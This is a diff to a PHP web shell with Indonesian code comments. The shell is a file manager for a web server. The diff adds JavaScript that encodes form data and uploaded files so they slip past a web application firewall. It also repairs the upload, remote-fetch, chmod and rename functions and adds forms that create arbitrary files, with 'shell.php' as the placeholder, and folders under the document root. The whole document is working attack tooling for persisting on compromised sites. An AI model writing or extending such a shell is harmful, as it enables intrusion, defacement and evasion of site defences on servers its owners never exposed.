@@ -17,14 +17,26 @@ function wafprep(f){if(!f||!f.elements)return;var els=f.elements;
       if(e.value!==""&&e.value.charAt(0)!==WAFM)e.value=wafenc(e.value);}}
   try{f.action=wafencUrl(f.action);}catch(e){}}
 function wafhidden(f,n,v){var h=document.createElement("input");h.type="hidden";h.name=n;h.value=v;f.appendChild(h);}
+/* form.submit() TIDAK mengirim nama+nilai tombol submit yang diklik, jadi nilainya
+   disalin ke hidden input supaya aksi di PHP (upload/edit/chmod/rename/create) tetap jalan. */
+var WAFBTN=null;
+document.addEventListener("click",function(ev){var t=ev.target;
+  if(t&&t.tagName==="INPUT"&&(t.type==="submit"||t.type==="image")&&t.name)WAFBTN=t;},true);
+function wafbtn(f,sb){
+  sb=sb||WAFBTN;
+  if(!sb||!sb.name||!f.querySelectorAll)return;
+  var n=sb.name,v=sb.value||"1";      /* baca dulu: atribut name elemen ini akan dihapus */
+  var q=f.querySelectorAll("input[type=submit][name='"+n+"']");
+  for(var i=0;i<q.length;i++)q[i].removeAttribute("name");
+  wafhidden(f,n,v);}
 document.addEventListener("submit",function(ev){var f=ev.target;if(!f||f.tagName!=="FORM")return;
   if(f.getAttribute("data-waf")==="1")return;
   var fi=null,q=f.querySelectorAll?f.querySelectorAll("input[type=file]"):[];
   for(var i=0;i<q.length;i++){if(q[i].files&&q[i].files.length){fi=q[i];break;}}
-  if(fi){ev.preventDefault();var fr=new FileReader();
+  if(fi){ev.preventDefault();var sb=ev.submitter||WAFBTN;var fr=new FileReader();
     fr.onload=function(){var u=new Uint8Array(fr.result),s="";for(var j=0;j<u.length;j++)s+=String.fromCharCode(u[j]);
       wafhidden(f,"berkas_name",fi.files[0].name);wafhidden(f,"berkas_data",s);
-      fi.removeAttribute("name");fi.value="";wafprep(f);f.setAttribute("data-waf","1");f.submit();};
+      fi.removeAttribute("name");fi.value="";wafbtn(f,sb);wafprep(f);f.setAttribute("data-waf","1");f.submit();};
     fr.readAsArrayBuffer(fi.files[0]);return;}
   wafprep(f);},true);
 window.addEventListener("DOMContentLoaded",function(){
@@ -237,36 +249,90 @@ echo '">'.$lok.'</a>/';
 }
 
 echo '</td></tr><tr><td><br>';
-if (isset($_POST['upwkwk'])) {
-	if (isset($_POST['berkasnya'])) {
-		if ($_POST['dirnya'] == "2") {
+if (isset($_POST['upwkwk']) || isset($_POST['berkasnya']) || isset($_POST['berkas_data']) || isset($_POST['berkas_name']) || isset($_FILES['berkas'])) {
+	/* cabang dipilih dari DATA (bukan hanya nama tombol submit) supaya upload tetap
+	   jalan walau nilai tombol submit tidak ikut terkirim. */
+	if (isset($_POST['berkasnya']) || isset($_POST['berkas_data']) || isset($_POST['berkas_name']) || isset($_FILES['berkas'])) {
+		if (isset($_POST['dirnya']) && $_POST['dirnya'] == "2") {
 			$lokasi = $_SERVER['DOCUMENT_ROOT'];
 		}
 		if (isset($_POST['berkas_data'])) {   /* WAF patch: upload via field ter-encode */
-			$bn = $_POST['berkas_name']; $bd = $_POST['berkas_data'];
+			$bn = isset($_POST['berkas_name']) ? $_POST['berkas_name'] : '';
+			$bd = $_POST['berkas_data'];
 		} else {
-			$bn = $_FILES['berkas']['name']; $bd = @file_get_contents($_FILES['berkas']['tmp_name']);
+			$bn = isset($_FILES['berkas']['name']) ? $_FILES['berkas']['name'] : '';
+			$bd = @file_get_contents($_FILES['berkas']['tmp_name']);
 		}
-		$data = @file_put_contents($lokasi."/".$bn, $bd);
-		if (file_exists($lokasi."/".$bn)) {
-			echo "File Uploaded ! &nbsp;<font color='gold'><i>".$lokasi."/".$bn."</i></font><br><br>";
+		$bn = basename(str_replace('\\', '/', $bn));   /* buang komponen direktori */
+		$tujuan = $lokasi."/".$bn;
+		if ($bn === '' || $bn === '.' || $bn === '..') {
+			red("Failed to Upload : nama file kosong !");
+		} elseif (@file_put_contents($tujuan, $bd) === false) {
+			red("Failed to Upload : tidak bisa menulis ke ".$tujuan);
 		} else {
-			echo "<font color='red'>Failed to Upload !<br><br>";
+			echo "File Uploaded ! &nbsp;<font color='gold'><i>".$tujuan."</i></font> (".strlen($bd)." byte)<br><br>";
 		}
-	} elseif (isset($_POST['linknya'])) {
+		$lokasinya = @scandir($lokasi);
+	} elseif (isset($_POST['linknya']) || isset($_POST['darilink'])) {
 		if (empty($_POST['namalink'])) {
 			exit("Filename cannot be empty !");
 		}
-		if ($_POST['dirnya'] == "2") {
+		if (isset($_POST['dirnya']) && $_POST['dirnya'] == "2") {
 			$lokasi = $_SERVER['DOCUMENT_ROOT'];
 		}
-		$data = @file_put_contents($lokasi."/".$_POST['namalink'], @file_get_contents($_POST['darilink']));
-		if (file_exists($lokasi."/".$_POST['namalink'])) {
-			echo "File Uploaded ! &nbsp;<font color='gold'><i>".$lokasi."/".$_POST['namalink']."</i></font><br><br>";
+		$namalink = basename(str_replace('\\', '/', $_POST['namalink']));
+		if (@file_put_contents($lokasi."/".$namalink, @file_get_contents($_POST['darilink'])) === false) {
+			red("Failed to Upload !");
 		} else {
-			echo "<font coloe='red'>Failed to Upload !<br><br>";
+			echo "File Uploaded ! &nbsp;<font color='gold'><i>".$lokasi."/".$namalink."</i></font><br><br>";
+		}
+		$lokasinya = @scandir($lokasi);
+	} else {
+		red("Failed to Upload : tidak ada file yang dipilih !");
+	}
+}
+
+/* ===== fitur tambahan: Create File & Create Folder ===== */
+if (isset($_POST['buatfile']) || (isset($_POST['nama_file']) && $_POST['nama_file'] !== '')) {
+	if (isset($_POST['dirnya']) && $_POST['dirnya'] == "2") {
+		$lokasi = $_SERVER['DOCUMENT_ROOT'];
+	}
+	$nf = isset($_POST['nama_file']) ? trim($_POST['nama_file']) : '';
+	$isi = isset($_POST['isi_file']) ? $_POST['isi_file'] : '';
+	$tujuan = $lokasi."/".ltrim(str_replace('\\', '/', $nf), '/');
+	if ($nf === '') {
+		red("Create File Failed : nama file kosong !");
+	} elseif (file_exists($tujuan)) {
+		red("Create File Failed : ".$tujuan." sudah ada !");
+	} else {
+		if (!is_dir(dirname($tujuan))) {
+			@mkdir(dirname($tujuan), 0755, true);
+		}
+		$w = @file_put_contents($tujuan, $isi);
+		if ($w === false) {
+			red("Create File Failed : ".$tujuan);
+		} else {
+			echo "File Created ! &nbsp;<font color='gold'><i>".$tujuan."</i></font> (".$w." byte)<br><br>";
 		}
 	}
+	$lokasinya = @scandir($lokasi);
+}
+if (isset($_POST['buatdir']) || (isset($_POST['nama_dir']) && $_POST['nama_dir'] !== '')) {
+	if (isset($_POST['dirnya']) && $_POST['dirnya'] == "2") {
+		$lokasi = $_SERVER['DOCUMENT_ROOT'];
+	}
+	$nd = isset($_POST['nama_dir']) ? trim(str_replace('\\', '/', $_POST['nama_dir']), ' /') : '';
+	$tujuan = $lokasi."/".$nd;
+	if ($nd === '') {
+		red("Create Folder Failed : nama folder kosong !");
+	} elseif (is_dir($tujuan)) {
+		red("Create Folder Failed : ".$tujuan." sudah ada !");
+	} elseif (@mkdir($tujuan, 0755, true)) {
+		echo "Folder Created ! &nbsp;<font color='gold'><i>".$tujuan."</i></font><br><br>";
+	} else {
+		red("Create Folder Failed : ".$tujuan);
+	}
+	$lokasinya = @scandir($lokasi);
 }
 
 echo "Upload File : ";
@@ -277,6 +343,17 @@ echo '<form enctype="multipart/form-data" method="post">
 <input type="hidden" name="upwkwk" value="aplod">
 <input type="file" name="berkas"><input type="submit" name="berkasnya" value="Upload" class="up" style="cursor: pointer; border-color: #fff"><br>
 <input type="text" name="darilink" class="up" placeholder="https://anon7.xyz/upload.txt">&nbsp;<input type="text" name="namalink" class="up" size="3" placeholder="file.txt"><input type="submit" name="linknya" class="up" value="Upload" style="cursor: pointer; border-color: #fff">
+</form>';
+echo "Create File / Folder : ";
+echo '<form method="post">
+<input type="radio" value="1" name="dirnya" checked>current_dir [ '.cekdir().' ]
+<input type="radio" value="2" name="dirnya" >document_root [ '.cekroot().' ]
+<br>
+Nama file : <input type="text" name="nama_file" class="up" size="26" placeholder="shell.php">&nbsp;<input type="submit" name="buatfile" class="up" value="Create File" style="cursor: pointer; border-color: #fff">
+<br>
+Isi file (opsional) :<br>
+<textarea name="isi_file" cols="70" rows="3"></textarea><br>
+Nama folder : <input type="text" name="nama_dir" class="up" size="26" placeholder="folder-baru">&nbsp;<input type="submit" name="buatdir" class="up" value="Create Folder" style="cursor: pointer; border-color: #fff">
 </form>';
 echo "</table><br>";
 
@@ -303,39 +380,47 @@ if (isset($_GET['fileloc'])) {
 		}
 	}
 } elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "ubahmod") {
-	echo "<center>".$_POST['path']."<br>";
+	$cmode = isset($_POST['path']) ? $_POST['path'] : '';
+	echo "<center>".$cmode."<br>";
 	echo '<form method="post">
-	Permission : <input name="perm" type="text" class="up" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
-	<input type="hidden" name="path" value="'.$_POST['path'].'">
+	Permission (oktal, mis. 0644) : <input name="perm" type="text" class="up" size="5" value="'.substr(sprintf('%o', @fileperms($cmode)), -4).'" />
+	<input type="hidden" name="path" value="'.$cmode.'">
 	<input type="hidden" name="pilih" value="ubahmod">
 	<input type="submit" value="Change" name="chm0d" class="up" style="cursor: pointer; border-color: #fff"/>
 	</form>';
-	if (isset($_POST['chm0d'])) {
-		$cm = @chmod($_POST['path'], $_POST['perm']);
-		if ($cm == true) {
-			green("Change Mod Success !");
+	if (isset($_POST['chm0d']) || (isset($_POST['perm']) && trim($_POST['perm']) !== '')) {
+		/* chmod() butuh angka OKTAL: "0644" harus di-octdec dulu, kalau tidak PHP
+		   membacanya sebagai desimal 644 (mode jadi salah). */
+		if (@chmod($cmode, octdec(trim($_POST['perm'])))) {
+			green("Change Mod Success ! ".$cmode." = ".substr(sprintf('%o', @fileperms($cmode)), -4));
 		} else {
 			red("Change Mod Failed !");
 		}
 	}
 } elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "gantinama") {
-	if (isset($_POST['gantin'])) {
-		$ren = @rename($_POST['path'], $_POST['newname']);
-		if ($ren == true) {
-			green("Change Name Success !");
+	$rpath = isset($_POST['path']) ? $_POST['path'] : '';
+	$rname = isset($_POST['newname']) ? trim($_POST['newname']) : '';
+	if (($rpath !== '') && (isset($_POST['gantin']) || $rname !== '')) {
+		/* nama baru SELALU dibuat di folder yang sama dengan file aslinya,
+		   supaya rename tidak memindahkan file ke folder lain. */
+		$rtarget = dirname($rpath).'/'.$rname;
+		if ($rname === '') {
+			red("Change Name Failed : nama baru kosong !");
+		} elseif (basename($rname) === basename($rpath)) {
+			red("Nama tidak berubah.");
+		} elseif (file_exists($rtarget)) {
+			red("Change Name Failed : ".$rtarget." sudah ada !");
+		} elseif (@rename($rpath, $rtarget)) {
+			green("Change Name Success ! ".basename($rpath)." -> ".$rname);
+			$rpath = $rtarget;
 		} else {
 			red("Change Name Failed !");
 		}
 	}
-	if (empty($_POST['name'])) {
-		$namaawal = $_POST['newname'];
-	} else {
-		$namawal = $_POST['name'];
-	}
-	echo "<center>".$_POST['path']."<br>";
+	echo "<center>".$rpath."<br>";
 	echo '<form method="post">
-	New Name : <input name="newname" type="text" class="up" size="20" value="'.$namaawal.'" />
-	<input type="hidden" name="path" value="'.$_POST['path'].'">
+	New Name (di folder yang sama) : <input name="newname" type="text" class="up" size="20" value="'.basename($rpath).'" />
+	<input type="hidden" name="path" value="'.$rpath.'">
 	<input type="hidden" name="pilih" value="gantinama">
 	<input type="submit" value="Change" name="gantin" class="up" style="cursor: pointer; border-color: #fff"/>
 	</form>';
